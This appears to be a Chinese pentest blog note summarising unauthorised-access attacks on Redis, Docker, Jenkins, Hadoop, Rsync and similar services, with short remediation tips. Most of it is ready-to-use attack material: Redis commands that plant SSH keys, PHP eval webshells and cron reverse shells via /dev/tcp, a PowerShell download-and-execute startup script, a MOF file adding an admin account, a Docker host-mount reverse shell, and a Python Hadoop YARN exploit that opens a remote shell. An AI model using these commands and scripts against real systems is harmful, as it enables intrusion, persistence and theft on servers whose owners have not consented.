---
title: 未授权访问总结
date: 2020-1-22 20:00:01
---
## Redis未授权访问

`Redis` 默认情况下，会绑定在 `0.0.0.0:6379`，这样将会将 `Redis`  服务暴露到公网上

如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis  的数据。

攻击者在未授权访问 `Redis` 的情况下可以利用 `Redis` 的相关方法，可以成功在 Redis  服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器

### 利用条件和方法

**条件:**

> 1. `redis`服务以root账户运行
> 2. `redis`无密码或弱密码进行认证
> 3. `redis`监听在0.0.0.0公网上

**方法:**

> - 通过 `Redis` 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫
> - 上传SSH公钥获得SSH登录权限
> - 通过`crontab`反弹shell
> - Web目录下写`webshell`
> - slave主从模式利用

**获取info**

```bash
nmap -A -p 6379 –script redis-info 192.168.1.111		#扫描目标redis info
```
#### redis-cli
```bash
./redis-cli -h 192.168.1.111
```
这行命令是用来连接到远程Redis服务器的。这里，./redis-cli表示运行当前目录下的redis-cli可执行文件。redis-cli是Redis的命令行客户端，用于与Redis服务器进行交互。
接下来的参数如下：
-h:host, 这个参数用于指定要连接的远程Redis服务器的主机名或IP地址。192.168.1.111: 这是一个示例IP地址，表示要连接到的远程Redis服务器的IP地址。
Redis的命令行客户端redis-cli也有Windows版。虽然官方Redis团队不再维护Windows版本，但是微软的一个团队创建了一个Redis在Windows上的移植版本。这个版本包含了Windows版的redis-cli。



```bash
192.168.1.111:6739> info
keys *			#查看所有key
get key_name	#查看key的值，例如get password
flushall		#删除所有数据
del key			#删除键为key的数据

121.201.22.96:6379> config get dir    #查看当前目录
1) "dir"
2) "D:\\Redis"

config set dir <What Dir You want>
config set dbfilename <File Name.php>
```
`save`    
用于创建服务器当前数据库的磁盘快照（持久化）。它会将Redis内存中的数据保存到硬盘上的一个RDB（Redis数据库）文件中。这个文件可以用于备份、恢复数据或迁移到另一个Redis实例。

当执行SAVE命令时，Redis会阻塞所有其他客户端连接，直到磁盘快照创建完成。这意味着在SAVE命令执行期间，Redis不会处理任何其他客户端请求。对于大型数据库，SAVE命令可能会花费较长时间，因此，这可能导致服务器暂时不可用。

在生产环境中，通常建议使用BGSAVE命令而不是SAVE命令。BGSAVE命令会在后台异步地创建磁盘快照，而不会阻塞客户端连接。这使得在快照创建过程中，Redis仍然可以正常处理客户端请求。

#### 上传SSH公钥获得SSH登录权限

原理就是在数据库中插入一条数据，将本机的公钥作为value，(key值随意)

然后通过修改数据库的默认路径为`/root/.ssh`和默认的缓冲文件`authorized.keys`

把缓冲的数据保存在文件里，这样就可以在服务器端的`/root/.ssh`下生一个授权的key



首先在自己的电脑上生成key:

```bash
ssh-keygen -t rsa
```

将公钥导入`key.txt`文件（前后用\n\n换行，避免和`Redis`里其他缓存数据混合）
```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```
1.`echo -e "\n\n"`: echo命令用于在命令行中输出指定的字符串。-e参数表示解释转义字符，如\n表示换行。因此，这部分命令会输出两个连续的换行符。
2.`cat id_rsa.pub`: cat命令用于在命令行中显示文件内容。这里，它显示名为id_rsa.pub的文件的内容。通常，id_rsa.pub文件是一个公钥文件，用于SSH身份验证。
3.`echo -e "\n\n"`: 这部分与第1部分相同，输出两个连续的换行符。
4.`>`: 重定向操作符。它将前面命令的输出重定向到指定的文件。如果文件不存在，它将创建一个新文件。如果文件已存在，它将覆盖文件中的现有内容。
5.`key.txt`: 这是重定向操作符>指向的文件。在这个例子中，前面的命令将把输出写入到名为key.txt的文件中。
综上，这个命令将在key.txt文件中插入两个换行符，然后追加id_rsa.pub文件的内容，并在其后再插入两个换行符。这对于在将多个密钥文件合并到一个文件中时保持可读性是有帮助的。

再把`key.txt`文件内容写入目标主机的缓冲里
```bash
cat key.txt | ./redis-cli -h 192.168.10.153 -x set test
```

连接目标主机的`Redis`，设置`redis`的备份路径为/root/.ssh和保存文件名authorized_keys 

```bash
./redis-cli -h 192.168.1.111
config set dir /root/.ssh
config set dbfilename authorized_keys
keys *
get test	#查看数据是否存在
#将（缓存里的数据key.txt）保存在服务器硬盘上
save
#SSH 连接目标主机，无需密码即可登录
ssh 192.168.1.111

#cat /root/.ssh/authorized_keys 可以查看文件内容，是写入的公钥
```

#### 通过`crontab`定时任务反弹shell

原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名

```bash
#首先在客户端这边监听一个端口，端口不要冲突
nc -lv 6666

#连接redis，写入反弹shell
./redis-cli -h 192.168.1.111
set test2 "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/客户端IP/4444 0>&1\n\n"
config set dir /var/spool/cron
config set dbfilename root
save
```

#### Web目录写`WebShell`

```bash
./redis-cli -h 192.168.1.111
config set dir /var/www/html
set shell "\n\n\n<?php @eval($_POST['wintry']);?>\n\n\n"
config set dbfilename shell.php
save
```

```bash
hydra -P passwd.txt redis://192.168.1.111		#可以利用hydra爆破redis密码
```

#### slave主从复制实现ECE

##### `redis`主从复制（master-slave replication）

如果当把数据存储在单个`Redis`的实例中，当读写体量比较大的时候，服务端就很难承受。

为了应对这种情况，`Redis`就提供了主从模式，主从模式就是指使用一个`redis`实例作为主机，其他实例都作为备份机

其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式

##### `redis`模块

 和`mysql`类似，`redis`也支持扩展命令，我们需要编写so文件，来扩展命令。

> 1、我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。
>
> 2、我们设置备份文件名为so文件
>
> 3、设置传输方式为全量传输
>
> 4、加载so文件，实现任意命令执行

```bash
./redis-cli -h 192.168.1.111
MODULE LOAD /root/redis-rogue-server/exp.so
system.exec "whoami"
```

现成的工具，exp利用脚本：[redis-rce](https://github.com/vulhub/redis-rogue-getshell)

[Redis安装和配置主从复制](https://blog.csdn.net/ywd1992/article/details/83542955)

### Windows下的利用

**1、知道网站绝对路径，写WebShell**

```bash
192.168.1.9:6379> config set dir D:/phpstudy_pro/WWW
OK
192.168.1.9:6379> config set dbfilename shell.php
OK
192.168.1.9:6379> set x "<?php phpinfo();?>"
OK
192.168.1.9:6379> save
OK
```

**2、写入启动项**

```bash
#由于Start Menu之间有空格，因此需要用双引号将路径包含
192.168.1.9:6379>config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
OK
192.168.1.9:6379>config set dbfilename shell.bat
OK
192.168.1.9:6379>set x “rnrnpowershell.exe -nop -w hidden -c ”IEX ((new-object net.webclient).downloadstring(‘http://192.168.1.105:80/a’))”rnrn”#这是CS用团队服务器生成的马
OK
192.168.1.9:6379> save
OK
```

**3、写入MOF（2003-r2实验未成功）**

由于不能重启机器也无法获取web目录，想到Mof提权，环境限制只能为**win2003** 

>  mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做 ”托管对象格式” 
>
>  其作用是每隔五秒就会去监控进程创建和死亡。
>
>  就是用了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。
>
>  隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 

也就是说在`c:/windows/system32/wbem/mof/`目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。 

**保存mof.txt文件，内容如下**

```bash
#pragma namespace("\\.\root\subscription")
instance of __EventFilter as $EventFilter
{
EventNamespace = "Root\Cimv2";
Name = "filtP2";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa "Win32_LocalTime" "
"And TargetInstance.Second = 5";
QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = "consPCSV2";
ScriptingEngine = "JScript";
ScriptText =
"var WSH = new ActiveXObject("WScript.Shell")nWSH.run("net.exe user wintrysec admin666 /add")";
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};
```

然后执行

```bash
(echo -e "nn"; cat mof.txt; echo -e "nn") > foo.txt
cat foo.txt | redis-cli -h 192.168.1.10 -x set mof
redis-cli -h 192.168.1.10
config set dir c:/windows/system32/wbem/mof/
config set dbfilename wintrysec.mof
save
```

### 修复建议

> - 使用强密码认证
> - 降权运行 `g roupadd -r redis && useradd -r -g redis redis`，用低权限账户
> - protected mode限制`ip`禁止外网访问/修改默认端口   ( `redis.conf` )
> - `Redis`默认不生成日志，可以自己[配置](https://www.freebuf.com/column/158065.html)

**设置防火墙策略**

如果正常业务中`Redis`服务需要被其他服务器来访问，可以设置`iptables`策略仅允许指定的`IP`来访问`Redis`服务

**保证 authorized_keys 文件的安全**

为了保证安全，应该阻止其他用户添加新的公钥。

将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限 ：

```bash
chmod 400 ~/.ssh/authorized_keys
```

为保证 authorized_keys 的权限不会被改掉，还需要设置该文件的 immutable 位权限

```bash
chattr +i ~/.ssh/authorized_keys
```

但是，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。

要避免这种情况，需要设置 ~./ssh 的 immutable 权限

```bash
chattr +i ~/.ssh
```

## MongoDB 未授权访问

MongoDB 默认是没有权限验证的，登录的用户可以通过默认端口无需密码对数据库任意操作(增删改高危动作)，而且可以远程访问数据库

1、验证

```bash
telnet 目标IP 27017测试端口是否开放

Navicat直接连接。
若报错 wire version 0，则可以切换兼容的Robo3T连接。
```

2、修复建议

- 添加认证

## Memcached 未授权访问

> Memcached 分布式缓存系统，默认的 11211 端口不需要密码即可访问，攻击者直接访问即可获取数据库中所有信息，造成严重的信息泄露.Memcache itself provides a means to peek into its content. The memcache protocol provides commands to peek into the data that is organized by slabs (categories of data of a given size range).

memcached的TCP,UDP端口都是11211

打法：默认情况下，可以通过telnet做memcached做任何的操作，包括获取信息、添加健值、删除数据项目。而且一般情况下memcached是以root用户启动，可以作为攻击的点做提权获取更多的系统信息（redis也有这问题，用redis持久化写文件，添加证书、修改sshd配置项目，添加cron等，有很多服务器就是这样沦为肉鸡的）。
1、验证

```bash
telnet 目标IP 11211

stats
#查看memcache服务状态
```

2、修复建议

- 绑定的ip地址为 127.0.0.1限制为内网访问
- 或者通过firewall限制访问

## Zookeeper未授权访问

ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境

1、验证

```bash
echo envi|nc 目标IP 2181
```

2、防护建议

- 添加认证
- 限制内网访问

## Rsync 未授权访问漏洞

Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，默认端口837。

1、漏洞利用

```bash
#列举整个同步目录或指定目录：
rsync rsync://172.16.2.250:873/src

#下载文件或目录到本地：
rsync rsync://172.16.2.250:873/src/etc/passwd ./

#上传本地文件到服务端：
rsync -av nc rsync://172.16.2.250:873/src/etc/cron.hourly

#上传的文件可以直接是webshell或crontab反弹shell
```

2、修复建议

- 添加认证
- 限制IP访问

## Docker未授权访问

> docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker

1、验证

```bash
docker -H tcp://10.1.1.211:2375 version

#列出容器信息
curl http://<target>:2375/containers/json
```

2、漏洞利用，反弹宿主机shell

新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。

```bash
sudo docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
```

在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root

```bash
echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/1234 0>&1' >> /mnt/var/spool/cron/crontabs/root
```

本地监听端口，获取宿主机shell

```
nc -lvp 1234
```

3、修复建议

- 对2375端口做访问控制

## Jenkins未授权访问

1、访问`http://www.xxx.com:8080/manage`

2、点击脚本命令行

```bash
println "whoami".execute().text
```

3、漏洞利用，写入webshell

```bash
new File ("/var/www/html/shell.php").write('<?php phpinfo(); ?>');
```

4、修复建议

- 升级版本
- 添加认证、设置强密码复杂度及账号锁定
- 避免把Jenkins直接暴露在公网

## Hadoop 未授权访问

Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览、命令执行等操作，危害极大

1、验证

访问 `http://192.168.18.129:8088/cluster`

2、通过REST API命令执行

```bash
在本地监听端口 >> 创建Application >> 调用Submit Application API提交

#本地监听9999端口
nc -lvp 9999
```

3、EXP

```python
#!/usr/bin/env python

import requests

target = 'http://192.168.18.129:8088/'
lhost = '192.168.18.138' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

